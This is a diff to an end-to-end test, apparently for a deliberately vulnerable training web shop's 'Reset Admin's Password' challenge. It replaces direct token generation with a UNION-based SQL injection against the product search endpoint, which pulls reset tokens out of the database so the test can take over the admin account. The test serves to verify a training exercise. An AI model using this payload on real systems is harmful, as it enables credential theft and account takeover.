@@ -1,4 +1,4 @@
-import { createResetPasswordToken } from '../../../lib/resetPasswordTokenUtils'
+import { formatResetPasswordTokenDate } from '../../../lib/resetPasswordTokenUtils'
 
 describe('/#/forgot-password', () => {
   beforeEach(() => {
@@ -132,13 +132,17 @@ describe('/#/forgot-password', () => {
 
           cy.get('#email').type(adminEmail)
           cy.wait('@securityQuestion')
-          cy.get('#resetToken').should('not.be.disabled').focus().type(createResetPasswordToken(adminEmail))
-          cy.get('#newPassword').focus().type(newPassword)
-          cy.get('#newPasswordRepeat').focus().type(newPassword)
-          cy.get('#resetButton').click()
+          cy.request('/#/../rest/products/search?q=\')) union select UserId,\'2\',\'3\',token,expiresAt,\'6\',\'7\',\'8\',\'9\' from ResetPasswordTokens--')
+            .then(({ body }) => {
+              const adminToken = body.data.find((entry: any) => entry.id === 1 && entry.deluxePrice.startsWith(formatResetPasswordTokenDate()))?.price
+              cy.get('#resetToken').should('not.be.disabled').focus().type(adminToken)
+              cy.get('#newPassword').focus().type(newPassword)
+              cy.get('#newPasswordRepeat').focus().type(newPassword)
+              cy.get('#resetButton').click()
 
-          cy.get('.confirmation').should('not.be.hidden')
-          cy.expectChallengeSolved({ challenge: "Reset Admin's Password" })
+              cy.get('.confirmation').should('not.be.hidden')
+              cy.expectChallengeSolved({ challenge: 'Reset Admin\'s Password' })
+            })
         }
       )
     })
